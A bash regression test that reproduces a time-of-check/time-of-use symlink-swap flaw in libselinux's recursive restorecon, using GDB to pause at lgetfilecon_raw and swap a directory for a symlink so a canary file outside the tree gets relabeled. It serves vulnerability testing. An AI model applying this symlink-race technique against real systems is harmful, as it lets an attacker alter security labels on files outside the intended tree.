#!/bin/bash
#
# Reproducer for RHEL-217629: TOCTOU vulnerability in libselinux recursive
# restorecon allows relabeling of files outside the intended directory tree
# via symlink swapping.
#
# This is a deterministic, GDB-driven reproducer rather than a pure timing
# race. A plain race (background loop swapping a directory component while
# `restorecon -R` runs in a loop) did not reliably land within thousands of
# iterations even against genuinely vulnerable code - consistent with the
# report's own AC:H ("high attack complexity") rating, since the actual
# window is the gap between one internal libselinux call reading a file's
# current context and a later one writing its new context, which is far
# too narrow to hit by chance from an external, unsynchronized process.
#
# To remove the timing uncertainty, this script runs `restorecon -R` under
# GDB, sets a breakpoint on the read side of that gap, and performs the
# symlink swap synchronously the instant it is hit - reproducing the flaw
# on every run if it exists, independent of scheduler luck.
#
# Must be run as root on an SELinux-enabled system with gdb installed. Only
# touches files under private, randomly-named directories in /root.
#
# NOTE: the work and canary directories must live under a path prefix that
# file_contexts actually has a spec for (e.g. /root, matched by
# "/root(/.*)?"), otherwise restorecon has no default label to apply and
# silently skips relabeling everything, which would make this reproducer
# report "not vulnerable" for the wrong reason. /var/tmp/<random> does NOT
# have such a spec on a default targeted policy - only the literal /var/tmp
# path does - so it must not be used here.
#
# NOTE: the canary's file must be named exactly like the file under
# $WORKDIR/A/B ("file"), since the exploit relies on the pathname suffix
# "A/B/file" transparently resolving through the raced intermediate symlink
# to $CANARY/file - an intermediate path component is always followed by
# the kernel during path resolution, unlike the final component that l*()
# calls refuse to follow.
set -u

WORKDIR=$(mktemp -d /root/toctou_test.XXXXXX)
CANARY=$(mktemp -d /root/toctou_canary.XXXXXX)
GDBSCRIPT=$(mktemp /root/toctou_XXXXXX.gdb)
GDBLOG=$(mktemp /root/toctou_XXXXXX.log)

cleanup() {
	rm -f "$WORKDIR/A/B" 2>/dev/null
	[ -d "$WORKDIR/A/B.bak" ] && mv "$WORKDIR/A/B.bak" "$WORKDIR/A/B"
	rm -rf "$WORKDIR" "$CANARY" "$GDBSCRIPT" "$GDBLOG"
}
trap cleanup EXIT

echo canary > "$CANARY/file"
chcon -t httpd_sys_content_t "$CANARY/file" >/dev/null 2>&1
ORIG_CTX=$(stat -c %C "$CANARY/file")

mkdir -p "$WORKDIR/A/B"
echo data > "$WORKDIR/A/B/file"
chcon -R -t httpd_sys_content_t "$WORKDIR" >/dev/null 2>&1

TARGET="$WORKDIR/A/B/file"

# lgetfilecon_raw() is the read side of the get-current-context /
# set-new-context pair in the pre-fix restorecon_sb() implementation. Stop
# only on the invocation for our target path (skipping the other paths
# visited first: $WORKDIR, $WORKDIR/A, $WORKDIR/A/B), then swap A/B for a
# symlink to $CANARY before letting restorecon continue - so the *later*
# write call in the same pair (lsetfilecon(), matched by the same pathname
# string) resolves through the swapped component instead.
#
# On a fixed libselinux this breakpoint is simply never hit: the rewritten
# implementation pins each entry via an O_PATH fd opened once during the
# walk and never calls lgetfilecon_raw()/lsetfilecon() by path again, so
# there is nothing for this script to break on and restorecon just runs to
# completion.
cat > "$GDBSCRIPT" <<EOF
set pagination off
set breakpoint pending on
break lgetfilecon_raw
run
while !\$_streq((char*)\$rdi, "$TARGET")
  continue
end
shell mv '$WORKDIR/A/B' '$WORKDIR/A/B.bak'
shell ln -s '$CANARY' '$WORKDIR/A/B'
continue
EOF

# Guard against a runaway loop (e.g. a typo'd condition) hanging forever.
timeout 30 gdb -q -batch -x "$GDBSCRIPT" --args restorecon -R "$WORKDIR" \
	>"$GDBLOG" 2>&1
GDB_RC=$?

rm -f "$WORKDIR/A/B" 2>/dev/null
[ -d "$WORKDIR/A/B.bak" ] && mv "$WORKDIR/A/B.bak" "$WORKDIR/A/B"

NEW_CTX=$(stat -c %C "$CANARY/file")

echo "gdb exit code: $GDB_RC (124 = timed out and was killed - see log below)"
echo "canary context before: $ORIG_CTX"
echo "canary context after:  $NEW_CTX"
echo "--- gdb log ---"
cat "$GDBLOG"

if [ "$ORIG_CTX" != "$NEW_CTX" ]; then
	echo "VULNERABLE: canary file outside the relabeled tree was modified (RHEL-217629)"
	exit 1
else
	echo "NOT VULNERABLE: canary file context unchanged (RHEL-217629 fixed)"
	exit 0
fi
